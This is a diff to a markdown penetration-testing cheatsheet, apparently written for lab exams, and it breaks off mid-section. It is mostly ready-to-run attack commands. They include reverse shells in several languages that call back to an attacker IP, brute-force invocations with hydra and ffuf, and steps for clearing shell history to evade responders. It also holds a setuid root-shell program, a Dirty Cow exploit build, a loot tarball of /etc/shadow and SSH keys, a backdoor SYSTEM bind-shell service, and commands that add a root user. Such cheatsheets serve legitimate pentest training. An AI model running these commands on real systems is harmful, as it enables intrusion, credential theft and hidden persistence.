@@ -13,8 +13,8 @@ Other great cheetsheets:
 - [3. Scanning and Enumeration](#3-scanning-and-enumeration)
   - [3.1. Nmap Scanning](#31-nmap-scanning)
   - [3.2. Rustscan](#32-rustscan)
-  - [3.3. Simple Bash ping scanner](#33-simple-bash-ping-scanner)
-  - [3.4. Simple Bash port scanner](#34-simple-bash-port-scanner)
+  - [3.3. Simple Ping Scanner](#33-simple-ping-scanner)
+  - [3.4. Simple Port Scanner](#34-simple-port-scanner)
   - [3.5. 25,465,587 - SMTP/s Enumeration](#35-25465587---smtps-enumeration)
   - [3.6. 53 - DNS Enumeration](#36-53---dns-enumeration)
     - [3.6.1. DNS Zone Transfer](#361-dns-zone-transfer)
@@ -23,6 +23,7 @@ Other great cheetsheets:
     - [3.7.1. Web Server Software Enumeration](#371-web-server-software-enumeration)
     - [3.7.2. Web Directory Scanning](#372-web-directory-scanning)
     - [3.7.3. Common Web Vuln scanning with Nikto](#373-common-web-vuln-scanning-with-nikto)
+    - [3.7.4. WordPress Enumeration](#374-wordpress-enumeration)
   - [3.8. 88/749 Kerberos Enumeration](#38-88749-kerberos-enumeration)
   - [3.9. 110,995 - POP Enumeration](#39-110995---pop-enumeration)
   - [3.10. 111 - RPCbind Enumeration](#310-111---rpcbind-enumeration)
@@ -50,24 +51,25 @@ Other great cheetsheets:
     - [4.2.6. Web Form (HTTP POST) Bruteforcing](#426-web-form-http-post-bruteforcing)
     - [4.2.7. Zip File Password Cracking](#427-zip-file-password-cracking)
   - [4.3. Port Knocking](#43-port-knocking)
-  - [4.4. Reverse Shells](#44-reverse-shells)
-    - [4.4.1. Covering your tracks](#441-covering-your-tracks)
-    - [4.4.2. Running a detached/daeminized process on Linux](#442-running-a-detacheddaeminized-process-on-linux)
-    - [4.4.3. Netcat Listener](#443-netcat-listener)
-    - [4.4.4. Socat Listener](#444-socat-listener)
-    - [4.4.5. Bash Reverse Shell](#445-bash-reverse-shell)
-    - [4.4.6. Netcat Reverse Shell](#446-netcat-reverse-shell)
-    - [4.4.7. Socat Reverse Shell](#447-socat-reverse-shell)
-    - [4.4.8. Python Reverse Shell](#448-python-reverse-shell)
-    - [4.4.9. PHP Reverse Shell](#449-php-reverse-shell)
-    - [4.4.10. Perl Reverse Shell](#4410-perl-reverse-shell)
-    - [4.4.11. Powershell Reverse Shell](#4411-powershell-reverse-shell)
-    - [4.4.12. OpenSSL Encrypted Reverse Shell](#4412-openssl-encrypted-reverse-shell)
-  - [4.5. Encryption](#45-encryption)
-    - [4.5.1. Create self-signed SSL/TLS certificate](#451-create-self-signed-ssltls-certificate)
-    - [4.5.2. Decrypting files with GPG](#452-decrypting-files-with-gpg)
-  - [4.6. Post Exploit Frameworks](#46-post-exploit-frameworks)
-    - [4.6.1. Merlin Framework](#461-merlin-framework)
+  - [4.4. Buffer Overflows](#44-buffer-overflows)
+  - [4.5. Reverse Shells](#45-reverse-shells)
+    - [4.5.1. Covering your tracks](#451-covering-your-tracks)
+    - [4.5.2. Running a detached/daeminized process on Linux](#452-running-a-detacheddaeminized-process-on-linux)
+    - [4.5.3. Netcat Listener](#453-netcat-listener)
+    - [4.5.4. Socat Listener](#454-socat-listener)
+    - [4.5.5. Bash Reverse Shell](#455-bash-reverse-shell)
+    - [4.5.6. Netcat Reverse Shell](#456-netcat-reverse-shell)
+    - [4.5.7. Socat Reverse Shell](#457-socat-reverse-shell)
+    - [4.5.8. Python Reverse Shell](#458-python-reverse-shell)
+    - [4.5.9. PHP Reverse Shell](#459-php-reverse-shell)
+    - [4.5.10. Perl Reverse Shell](#4510-perl-reverse-shell)
+    - [4.5.11. Powershell Reverse Shell](#4511-powershell-reverse-shell)
+    - [4.5.12. OpenSSL Encrypted Reverse Shell](#4512-openssl-encrypted-reverse-shell)
+  - [4.6. Encryption](#46-encryption)
+    - [4.6.1. Create self-signed SSL/TLS certificate](#461-create-self-signed-ssltls-certificate)
+    - [4.6.2. Decrypting files with GPG](#462-decrypting-files-with-gpg)
+  - [4.7. Post Exploit Frameworks](#47-post-exploit-frameworks)
+    - [4.7.1. Merlin Framework](#471-merlin-framework)
 - [5. Windows Privilege Escalation](#5-windows-privilege-escalation)
   - [5.1. Basic Windows Post-Exploit Enumeration](#51-basic-windows-post-exploit-enumeration)
   - [5.2. Using Saved Windows Credentials](#52-using-saved-windows-credentials)
@@ -94,6 +96,8 @@ Other great cheetsheets:
   - [6.5. LD_PRELOAD and LD_LIBRARY_PATH](#65-ld_preload-and-ld_library_path)
   - [6.6. SUID binaries](#66-suid-binaries)
   - [6.7. Using NFS for Privilege Escalation](#67-using-nfs-for-privilege-escalation)
+  - [6.8. Linux Kernel Exploits](#68-linux-kernel-exploits)
+    - [6.8.1. Dirty Cow Linux Privesc](#681-dirty-cow-linux-privesc)
 - [7. Loot](#7-loot)
   - [7.1. Upgrading to Interactive Shell](#71-upgrading-to-interactive-shell)
   - [7.2. File Transfers](#72-file-transfers)
@@ -126,17 +130,20 @@ Other great cheetsheets:
   - [8.3. Add RDP User](#83-add-rdp-user)
   - [8.4. Connect to Windows RDP](#84-connect-to-windows-rdp)
   - [8.5. Change Windows Domain Credentials](#85-change-windows-domain-credentials)
+  - [8.6. Create Windows Backdoor Service](#86-create-windows-backdoor-service)
 - [9. Linux Persistence](#9-linux-persistence)
   - [9.1. Grant passwordless sudo access](#91-grant-passwordless-sudo-access)
+  - [9.2. Setting SUID bit](#92-setting-suid-bit)
 - [10. Pivoting and Redirection](#10-pivoting-and-redirection)
   - [10.1. SSH Tunnels](#101-ssh-tunnels)
-  - [10.2. Bending with iptables](#102-bending-with-iptables)
-  - [10.3. Bending with socat](#103-bending-with-socat)
-  - [10.4. Bending with rinetd](#104-bending-with-rinetd)
-  - [10.5. Bending with netsh](#105-bending-with-netsh)
-  - [10.6. Bending with sshuttle](#106-bending-with-sshuttle)
-  - [10.7. Bending with chisel](#107-bending-with-chisel)
-  - [10.8. Bending with netcat](#108-bending-with-netcat)
+  - [10.2. SOCKS Proxies and proxychains](#102-socks-proxies-and-proxychains)
+  - [10.3. Bending with iptables](#103-bending-with-iptables)
+  - [10.4. Bending with socat](#104-bending-with-socat)
+  - [10.5. Bending with rinetd](#105-bending-with-rinetd)
+  - [10.6. Bending with netsh](#106-bending-with-netsh)
+  - [10.7. Bending with sshuttle](#107-bending-with-sshuttle)
+  - [10.8. Bending with chisel](#108-bending-with-chisel)
+  - [10.9. Bending with netcat](#109-bending-with-netcat)
 - [11. Miscellaneous](#11-miscellaneous)
   - [11.1. Disable SSH Host Key Checking](#111-disable-ssh-host-key-checking)
   - [11.2. Convert text to Windows UTF-16 format on Linux](#112-convert-text-to-windows-utf-16-format-on-linux)
@@ -156,10 +163,17 @@ mkdir -p scans/nmap; cd scans; nmap -v -n -A -oA nmap/initial-scan $VICTIM_IP
 # all TCP ports, fast discovery, then script scan:
 # verbose, no DNS resolution, fastest timing, all TCP ports, output all formats
 ports=$(nmap -v -n -T4 --min-rate=1000 -p- --open --reason $VICTIM_IP | grep '^[0-9]' | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
-nmap -n -v -sC -sV -p $ports -oA nmap/tcp-all $VICTIM_IP
+nmap -n -v -sC -sV -Pn -p $ports -oA nmap/tcp-all $VICTIM_IP
 
+# fast full TCP discovery using massscan:
+sudo masscan -p1-65535 $VICTIM_IP --rate=1000 -e tun0 > masscan.txt
+tcpports=$(cat masscan.txt | cut -d ' ' -f 4 | cut -d '/' -f 1 | sort -n | tr '\n' ',' | sed 's/,$//')
+sudo nmap -n -p $tcpports -oA nmap/tcp-all -Pn --script "default,safe,vuln" -sV $VICTIM_IP
+
+# UDP fast scan
+sudo nmap -n -v -sU -F -T4 --reason -T4 -oA nmap/udp-fast $VICTIM_IP
 # top 50 UDP ports
-sudo nmap -n -v -sU --top-ports=50 --reason -oA nmap/udp-top50 -T4 $VICTIM_IP
+sudo nmap -n -v -sU -T4 --top-ports=50 --reason -oA nmap/udp-top50 $VICTIM_IP
 
 # specifying safe and wildcard ftp-* scripts
 # logic: and, or, not all work. "," is like "or"
@@ -176,7 +190,7 @@ VICTIM_IP=VICTIM_IP
 mkdir -p scans/nmap; cd scans; sudo rustscan --ulimit 5000 -a $VICTIM_IP -- -n -Pn -A -oA nmap/all-ports
 ```
 
-## 3.3. Simple Bash ping scanner
+## 3.3. Simple Ping Scanner
 
 Pings all hosts in a /24 subnet. Provide any IP address in the subnet as arg.
 
@@ -193,9 +207,17 @@ wait $(jobs -rp)
 echo "Done"
 ```
 
-## 3.4. Simple Bash port scanner
+And here's a one-liner to do it in windows:
 
-Scans all 65535 ports of a single host. Provide host IP as arg.
+```bat
+:: note: meant to be copy-pasted, not in .bat script (%i vs %%i)
+for /L %i in (1,1,255) do @ping -n 1 -w 200 10.5.5.%i > nul && echo 10.5.5.%i is up.
+```
+
+## 3.4. Simple Port Scanner
+
+Scans all 65535 ports of a single host. Provide host IP as arg. Only works on
+LINUX systems!
 
 ```sh
 #!/bin/bash
@@ -242,6 +264,8 @@ See [HackTricks](https://book.hacktricks.xyz/pentesting/pentesting-smtp)
 
 **PRO TIP**: Make sure you add the DNS entries you discover to your
 `/etc/hosts` file. Some web servers do redirection based on domain name!
+
+**Format of `/etc/hosts` entry**:
 
 ```
 10.10.10.10     victim.com mail.victim.com www.victim.com admin.victim.com
@@ -324,13 +348,26 @@ whatweb -v -a3 $VICTIM_IP
 
 ```sh
 # Gobuster
-gobuster dir -eku http://$VICTIM_IP:8080 -w /usr/share/dirb/wordlists/common.txt -t 50 -x "txt,html,php,asp,aspx,jsp" -o gobuster-common.txt
+ulimit -n 8192 # prevent file access error during scanning
+gobuster dir -ezqrkw /usr/share/dirb/wordlists/common.txt -t 100 -x "txt,htm,html,php,asp,aspx,jsp,cgi" -o gobuster-common.txt -u http://$VICTIM_IP:8080
+# -e / --expanded = Expanded mode, print full URLs (easy for clicking to open)
+# -z / --no-progress = no progress displayed
+# -q / --quiet = quiet mode (no banner)
+# -r / --follow-redirect
+# -k / --no-tls-validation
+# -w / --wordlist
+# -t / --threads
+# -o / --output
+
 # user-agent:
 # -a 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3831.6 Safari/537.36'
 # other good common list: /usr/share/seclists/Discovery/Web-Content/common.txt
 
-# FFUF through a SOCKS proxy
-ffuf -o ffuf.json -recursion -recursion-depth 2 -x socks5://localhost:1080 -u http://$VICTIM_IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
+# adding a proxy to gobuster:
+# -p socks5://127.0.0.1:1080 (or --proxy)
+
+# FFUF as a dirbuster through a SOCKS proxy
+ffuf -o ffuf.json -recursion -recursion-depth 2 -x socks5://localhost:1080 -e .php,.jsp,.txt,.cgi,.asp,.aspx -u http://$VICTIM_IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
 # pretty print json output:
 ffuf.json | python -m json.tool
 ```
@@ -338,7 +375,39 @@ ffuf.json | python -m json.tool
 ### 3.7.3. Common Web Vuln scanning with Nikto
 
 ```sh
-nikto -o nikto.txt -h 10.11.1.123
+# -C all means scan all cgi-dirs
+nikto -o nikto.txt --maxtime=180s -C all -h $VICTIM_IP
+```
+
+### 3.7.4. WordPress Enumeration
+
+```sh
+wpscan --url http://$VICTIM_IP/
+
+# --enumerate options:
+# p = Popular plugins
+# vp = Vulnerable plugins
+# ap = All plugins (takes a while)
+# t = Popular themes
+# vt = Vulnerable themes
+# at = All themes (takes a while)
+# cb = Config backups
+# tt = Timthumbs
+# dbe = Db exports
+# u = usernames w/ ids 1-10
+# m = media IDs 1-10
+# NOTE: Value if no argument supplied: --enumerate vp,vt,tt,cb,dbe,u,m
+
+# username / password bruteforce possible
+# -U, --usernames LIST
+#     LIST of usernames and/or files w/ usernames to try. e.g. admin,users.txt
+#     Will auto-enum users if -U not supplied
+# -P, --passwords FILE-PATH
+#     path to password file for brute force
+# --login-uri URI
+#     The URI of the login page if different from /wp-login.php
+# --random-user-agent
+#     Be a bit more stealthy
 ```
 
 ## 3.8. 88/749 Kerberos Enumeration
@@ -380,8 +449,8 @@ openssl s_client -connect $VICTIM_IP:995 -crlf -quiet
 nmap -n -v -p110 -sV --script="pop3-* and safe" -oA nmap/pop3 $VICTIM_IP
 
 # Bruteforcing
-hydra -l USERNAME -P /usr/share/seclists/Passwords/2020-200_most_used_passwords.txt -f $VICTIM_IP pop3
-hydra -S -l USERNAME -P /path/to/passwords.txt -s 995 -f $VICTIM_IP pop3
+hydra -V -f -l USERNAME -P /usr/share/seclists/Passwords/2020-200_most_used_passwords.txt $VICTIM_IP pop3
+hydra -V -f -S -l USERNAME -P /path/to/passwords.txt -s 995 $VICTIM_IP pop3
 
 # user enum / log in
 nc -nvC $VICTIM_IP 110  # "-C" for \r\n line endings, required
@@ -453,6 +522,7 @@ Definitely look at [HackTricks](https://book.hacktricks.xyz/pentesting/pentestin
 ```sh
 # list available shares
 smbmap -H $VICTIM_IP
+# try with '-u guest' if getting "[!] Authentication error"
 
 # list (only) windows version
 smbmap -vH $VICTIM_IP
@@ -468,6 +538,9 @@ enum4linux $VICTIM_IP
 
 # scan all the things
 enum4linux -aMld $VICTIM_IP | tee enum4linux.log
+# try with guest user if getting nothing via null session:
+enum4linux -u guest -aMld $VICTIM_IP | tee enum4linux.log
+# may need workgroup: '-w' (smbmap can get it when enum4linux doesn't)
 
 # nmap script scans
 nmap --script="safe and smb-*" -n -v -p 445 $VICTIM_IP
@@ -524,7 +597,8 @@ impacket-mssqlclient DOMAIN/USERNAME@$VICTIM_IP -windows-auth
 
 ```sql
 -- Check if you have server admin rights to enable command execution:
-SELECT IS_SRVROLEMEMBER('sysadmin')
+SELECT IS_SRVROLEMEMBER('sysadmin');
+go
 
 -- turn on advanced options; needed to configure xp_cmdshell
 sp_configure 'show advanced options', '1';
@@ -548,9 +622,11 @@ go
 
 ## 3.15. 2049 - NFS Enumeration
 
+[HackTricks](https://book.hacktricks.xyz/pentesting/nfs-service-pentesting)
+
 ```sh
 # scan with scripts
-nmap -n -v -p 2049 --script="safe and nfs-*" -oA nmap/nfs-scripts $VICTIM_IP
+nmap -n -v -p 2049 -sV --script="safe and nfs-*" -oA nmap/nfs-scripts $VICTIM_IP
 
 # list all mountpoints
 showmount -a $VICTIM_IP
@@ -559,10 +635,17 @@ showmount -d $VICTIM_IP
 # list all exports (remote folders you can mount)
 showmount -e $VICTIM_IP
 
+# the exports are also in /etc/exports
+# look for exports with no_root_squash/no_all_squash setting for privesc
+# https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
+
+# Mounting an exported share:
 # mount -t nfs [-o vers=2] <ip>:<remote_folder> <local_folder> -o nolock
 # use version 2 because it doesn't have any authentication or authorization
+# if mount fails, try without vers=2
 # dir may need "/"prefix
-mkdir nfs && sudo mount -t nfs -o vers=2 -o nolock $VICTIM_IP:DIR nfs
+# dir is one of showmount -e results (from /etc/exports)
+mkdir nfs && sudo mount -t nfs -o rw,nolock,vers=2 $VICTIM_IP:DIR nfs
 
 # create user with specific UID to be able to read files on your kali box
 # "-s" login shell, "-M" no create home
@@ -575,6 +658,8 @@ sudo su
 sudo groupadd -g 1010 tempgroup
 sudo usermod -a -G tempgroup tempuser
 ```
+
+See also: [6.7. Using NFS for Privilege Escalation](#67-using-nfs-for-privilege-escalation)
 
 ## 3.16. 3306 - MySQL Enumeration
 
@@ -749,7 +834,7 @@ nmap -v -n -sV --script vnc-info,realvnc-auth-bypass,vnc-title -oA nmap/vnc -p 5
 vncviewer $VICTIM_IP
 
 # bruteforcing
-hydra -L user.txt –P pass.txt -s PORT vnc://$VICTIM_IP
+hydra -V -f -L user.txt –P pass.txt -s PORT vnc://$VICTIM_IP
 medusa -h $VICTIM_IP –u root -P pass.txt –M vnc
 ncrack -V --user root -P pass.txt $VICTIM_IP:PORT
 patator vnc_login host=$VICTIM_IP password=FILE0 0=pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0use auxiliary/scanner/vnc/vnc_login
@@ -838,7 +923,7 @@ rules.
 # Be carefull with the number of password in the list, this could lock-out accounts
 # Use the NetBIOS name of the machine as domain, if needed
 crackmapexec mssql $VICTIM_IP -d DOMAINNAME -u usernames.txt -p passwords.txt
-hydra -L /path/to/usernames.txt –P /path/to/passwords.txt $VICTIM_IP mssql
+hydra -V -f -L /path/to/usernames.txt –P /path/to/passwords.txt $VICTIM_IP mssql
 medusa -h $VICTIM_IP –U /path/to/usernames.txt –P /path/to/passwords.txt –M mssql
 nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=usernames.txt,passdb=passwords.txt,ms-sql-brute.brute-windows-accounts $VICTIM_IP
 ```
@@ -847,7 +932,7 @@ nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=user
 
 ```sh
 nmap --script smb-brute -p 445 $VICTIM_IP
-hydra -l Administrator -P passwords.txt -t 1 $VICTIM_IP smb
+hydra -V -f -l Administrator -P passwords.txt -t 1 $VICTIM_IP smb
 ```
 
 ### 4.2.5. SSH Bruteforcing
@@ -855,10 +940,10 @@ hydra -l Administrator -P passwords.txt -t 1 $VICTIM_IP smb
 ```sh
 # using hydra
 # '-s PORT' contact service on non-default port
-hydra -l username -P wordlist.txt -s 2222 $VICTIM_IP ssh
+hydra -V -f -l username -P wordlist.txt -s 2222 $VICTIM_IP ssh
 
 # spray creds to entire subnet to see if they work on other boxes, too!
-hydra -l username -p password -W 5 10.11.1.0/24 ssh
+hydra -V -f -l username -p password -W 5 10.11.1.0/24 ssh
 
 # using patator: useful when services (e.g. ssh) are too old for hydra to work
 patator ssh_login host=$VICTIM_IP port=2222 persistent=0 -x ignore:fgrep='failed' user=username password=FILE0 0=/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt
@@ -876,7 +961,10 @@ medusa -u root -P 500-worst-passwords.txt -h $VICTIM_IP -M ssh
 # '-P wordlist.txt' means iterate through all passwords in wordlist. '-p password123' uses only that one.
 # '-t 64': use 64 threads
 # change to https-web-form for port 443
-hydra -l admin -P ~/repos/SecLists/Passwords/Leaked-Databases/rockyou-50.txt $VICTIM_IP_OR_DOMAIN http-post-form "/blog/admin.php:username=^USER^&password=^PASS^:Incorrect username" -t 64
+hydra -V -f -l admin -P ~/repos/SecLists/Passwords/Leaked-Databases/rockyou-50.txt $VICTIM_IP_OR_DOMAIN http-post-form "/blog/admin.php:username=^USER^&password=^PASS^:Incorrect username" -t 64
+
+# proxy-aware password bruteforcing with ffuf
+ffuf -x socks5://localhost:1080 -u http://$VICTIM_IP/login -X POST -w /usr/share/seclists/Passwords/2020-200_most_used_passwords.txt -d "UsernameOrODEmail=admin&Password=FUZZ&RememberMe=true" -fw 6719
 ```
 
 ### 4.2.7. Zip File Password Cracking
@@ -903,12 +991,43 @@ nmap -Pn --host-timeout 201 --max-retries 0 -r -p22,23,24 $VICTIM_IP
 nc -z $VICTIM_IP 22-24
 ```
 
-## 4.4. Reverse Shells
+## 4.4. Buffer Overflows
+
+Here is some python code to help with fuzzing and finding the bad bytes for
+a buffer overflow exploit.
+
+```py
+#!/usr/bin/env python3
+import shlex
+from subprocess import check_output
+
+__cyclic = ""
+def cyclic(length):
+    """Generates a cyclic pattern if given length.
+    The pattern's bytes can be fed into the ragg2 tool from the
+    radare2 project to find offsets in memory corruption vulns"""
+    global __cyclic
+    if len(__cyclic) < length:
+        __cyclic = check_output(
+            shlex.split(f"ragg2 -rP {length * 2}")
+            ).decode()
+    return __cyclic[:length]
+
+def badbytes(known_bad=b"\x00"):
+    """Generates a series of bytes, omitting known bad ones, to help identify
+    other bad bytes.
+    To add more bytes to the known-bad set, just make a longer byte string,
+    e.g. b"\x00\x0a\x0d"
+    """
+    return bytes(range(256)).translate(None, delete=known_bad)
+```
+
+## 4.5. Reverse Shells
 
 - [Pentest Monkey Cheatsheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
 - [Reverse Shell Generator](https://www.revshells.com/)
 
-### 4.4.1. Covering your tracks
+### 4.5.1. Covering your tracks
 
 When you connect via a reverse/bind shell, your commands get saved in the
 terminal history. To avoid logging this (to make incident response team's job
@@ -926,7 +1045,7 @@ Set-PSReadlineOption –HistorySaveStyle SaveNothing
 Remove-Module PSReadline
 ```
 
-### 4.4.2. Running a detached/daeminized process on Linux
+### 4.5.2. Running a detached/daeminized process on Linux
 
 When delivering a payload, sometimes it needs to run as a daemon so it doesn't
 die when the session/connection is closed. Normally you do this with `nohup`,
@@ -937,14 +1056,14 @@ Still, you can accomplish creating a daemonized process by using sub-shells:
 ( ( while true; do echo "insert reverse shell cmd here"; sleep 5; done &) &)
 ```
 
-### 4.4.3. Netcat Listener
+### 4.5.3. Netcat Listener
 
 ```sh
 nc -vlnp LISTEN_PORT
 # on mac, exclude the "-p" flag
 ```
 
-### 4.4.4. Socat Listener
+### 4.5.4. Socat Listener
 
 ```sh
 # full tty over TCP
@@ -960,14 +1079,14 @@ socat -d -d file:`tty`,raw,echo=0 OPENSSL-LISTEN:LISTEN_PORT,cert=mycert.pem,ver
 
 Note: to generate `mycert.pem` see [these instructions](#451-create-self-signed-ssltls-certificate)
 
-### 4.4.5. Bash Reverse Shell
+### 4.5.5. Bash Reverse Shell
 
 ```sh
 # only works on Linux
 bash -i >& /dev/tcp/LISTEN_IP/443 0>&1
 ```
 
-### 4.4.6. Netcat Reverse Shell
+### 4.5.6. Netcat Reverse Shell
 
 ```sh
 # if netcat has the -e flag:
@@ -977,7 +1096,7 @@ nc -e /bin/sh 192.168.119.144 443
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.119.144 443 >/tmp/f
 ```
 
-### 4.4.7. Socat Reverse Shell
+### 4.5.7. Socat Reverse Shell
 
 ```sh
 # with full tty
@@ -990,27 +1109,27 @@ socat EXEC:/bin/bash TCP:192.168.119.144:443
 socat EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane OPENSSL:192.168.119.144:443,verify=0
 ```
 
-### 4.4.8. Python Reverse Shell
+### 4.5.8. Python Reverse Shell
 
 ```sh
 python -c 'import os,socket,pty;s=socket.create_connection(("192.168.119.144",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
 ```
 
 
-### 4.4.9. PHP Reverse Shell
+### 4.5.9. PHP Reverse Shell
 
 ```sh
 # may have to try different socket numbers besides 3 (4,5,6...)
 php -r '$sock=fsockopen("192.168.119.144",443);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 
-### 4.4.10. Perl Reverse Shell
+### 4.5.10. Perl Reverse Shell
 
 ```sh
 perl -e 'use Socket;$i="192.168.119.144";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
 
-### 4.4.11. Powershell Reverse Shell
+### 4.5.11. Powershell Reverse Shell
 
 Invoke from `cmd` with `powershell -NoP -NonI -W Hidden -Exec Bypass -Command ...`
 
@@ -1018,7 +1137,7 @@ Invoke from `cmd` with `powershell -NoP -NonI -W Hidden -Exec Bypass -Command ..
 $client = New-Object System.Net.Sockets.TCPClient("192.168.119.144",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
 
-### 4.4.12. OpenSSL Encrypted Reverse Shell
+### 4.5.12. OpenSSL Encrypted Reverse Shell
 
 ```sh
 # generate key on server
@@ -1030,9 +1149,9 @@ sudo openssl s_server -accept 443 -key key.pem -cert cert.pem
 rm -f /tmp/f; mkfifo /tmp/f && openssl s_client -connect SERVER_IP:443 -quiet < /tmp/f 2>/dev/null | /bin/sh 2>&0 > /tmp/f &
 ```
 
-## 4.5. Encryption
+## 4.6. Encryption
 
-### 4.5.1. Create self-signed SSL/TLS certificate
+### 4.6.1. Create self-signed SSL/TLS certificate
 
 ```sh
 # generate separate .key and .crt files
@@ -1053,7 +1172,7 @@ openssl req -x509 -new -nodes -key ca.key -sha256 -days 365 -out client.pem
 openssl pkcs12 -export -in client.pem -inkey ca.key -out client.p12
 ```
 
-### 4.5.2. Decrypting files with GPG
+### 4.6.2. Decrypting files with GPG
 
 ```sh
 # import public and private keys into gpg
@@ -1069,9 +1188,9 @@ gpg --list-secret-keys
 gpg -d -o secret.txt secret.txt.gpg
 ```
 
-## 4.6. Post Exploit Frameworks
+## 4.7. Post Exploit Frameworks
 
-### 4.6.1. Merlin Framework
+### 4.7.1. Merlin Framework
 
 ```sh
 # get server (password: merlin)
@@ -1295,7 +1414,7 @@ certutil -decode encodedInputFileName decodedOutputFileName
 :: hex decode a file
 certutil --decodehex encoded_hexadecimal_InputFileName
 :: MD5 checksum
-certutil.exe -hashfile somefile.txt MD5
+certutil -hashfile somefile.txt MD5
 ```
 
 ### 5.4.5. Execute Inline Tasks with MSBuild.exe
@@ -1578,7 +1697,7 @@ for C# and .NET.
 ## 5.9. Miscellaneous Windows Commands
 
 ```bat
-:: restart the machine now
+:: restart/reboot the machine now
 shutdown /r /t 0
 
 :: infinite loop of command with 5s timeout between runs
@@ -1831,13 +1950,13 @@ done
 ```sh
 # if /etc/shadow is writable
 # generate new password
-mkpasswd -m sha-512 newpassword
+mkpasswd -m sha-512 password
 # edit /etc/shadow and overwrite hash of root with this one
 
 # if /etc/passwd is writable
-echo "root2:$(mkpasswd -m sha-512 newpassword):0:0:root:/root:/bin/bash" >> /etc/passwd
+echo "root2:$(mkpasswd -m sha-512 password):0:0:root:/root:/bin/bash" >> /etc/passwd
 # alternatively
-echo "root2:$(openssl passwd newpassword):0:0:root:/root:/bin/bash" >> /etc/passwd
+echo "root2:$(openssl passwd password):0:0:root:/root:/bin/bash" >> /etc/passwd
 # can also add generated password between the first and second colon of root user
 ```
 
@@ -1960,9 +2079,19 @@ the binary in question with your own:
 
 `hijack.c`
 ```c
+/* Gets root shell
+ * Compile (as root):
+ * gcc -Wall pwn.c -o pwn && chmod u+s pwn
+ */
+#define _GNU_SOURCE
+#include <stdlib.h>
+#include <unistd.h>
+
 int main() {
 	setuid(0);
+	setgid(0);
 	system("/bin/bash -p");
+  return 0;
 }
 ```
 
@@ -2005,12 +2134,26 @@ cat /etc/exports
 # On Kali box:
 sudo su   # switch to root
 mkdir /tmp/nfs
-mount -o rw,vers=2 $VICTIM_IP:/share_name /tmp/nfs
+mount -o rw,nolock,vers=2 $VICTIM_IP:/share_name /tmp/nfs
+# Note: if mount fails, try without vers=2 option.
 msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
 chmod +xs /tmp/nfs/shell.elf
 
 # on victim machine
 /tmp/shell.elf
+```
+
+## 6.8. Linux Kernel Exploits
+
+### 6.8.1. Dirty Cow Linux Privesc
+
+[CVE-2016-5195](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2016-5195)
+is effective against Linux kernels 2.x through 4.x before 4.8.3.
+
+```sh
+searchsploit -m 40847
+g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
+./dcow -s
 ```
 
 # 7. Loot
@@ -2074,6 +2217,7 @@ invoke-webrequest -uri http://ATTACKER/rsh.exe -out c:\users\public\rsh.exe
 ### 7.2.4. Mount NFS Share
 
 ```sh
+# try without vers=3 if mount fails. Also try with vers=2
 mount -t nfs -o vers=3 REMOTE_IP:/home/ /mnt/nfs-share
 ```
 
@@ -2181,8 +2325,8 @@ sshfs -F/full/path/to/ssh-config alpha:/ ./rootfs
 
 ```bat
 :: Download 7zip binary to ./7zip.exe, using urlcache or verifyctl
-certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe
-certutil.exe -verifyctl -f -split http://7-zip.org/a/7z1604-x64.exe 7zip.exe
+certutil -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe
+certutil -verifyctl -f -split http://7-zip.org/a/7z1604-x64.exe 7zip.exe
 
 :: Download using expand
 expand http://7-zip.org/a/7z1604-x64.exe 7zip.exe
@@ -2361,12 +2505,15 @@ dpapi::chrome /in:"c:\users\administrator\AppData\Local\Google\Chrome\User Data\
 tar zcf loot.tar.gz \
 /etc/passwd{,-} \
 /etc/shadow{,-} \
-/etc/ssh/ssh_host_* \
+/etc/ssh/ssh_config \
+/etc/ssh/sshd_config \
 /home/*/.ssh/id* \
+/home/*/.ssh/authorized_keys* \
 /home/*/.gnupg \
-/root/*/.gnupg \
+/root/.gnupg \
 /root/.ssh/id* \
-/root/network-secret.txt \
+/root/.ssh/authorized_keys* \
+/root/network-secret*.txt \
 /root/proof.txt
 ```
 
@@ -2486,6 +2633,23 @@ If you want to change the password of a user on a windows domain:
 Set-ADAccountPassword -Identity someuser -OldPassword (ConvertTo-SecureString -AsPlainText "p@ssw0rd" -Force) -NewPassword (ConvertTo-SecureString -AsPlainText "qwert@12345" -Force)
 ```
 
+## 8.6. Create Windows Backdoor Service
+
+```bat
+:: Creates a SYSTEM bind-shell listening on port 54321
+sc create bdsvc binpath= "c:\windows\system32\cmd.exe /k c:\users\public\nc.exe -L -p 54321 -e c:\windows\system32\cmd.exe"
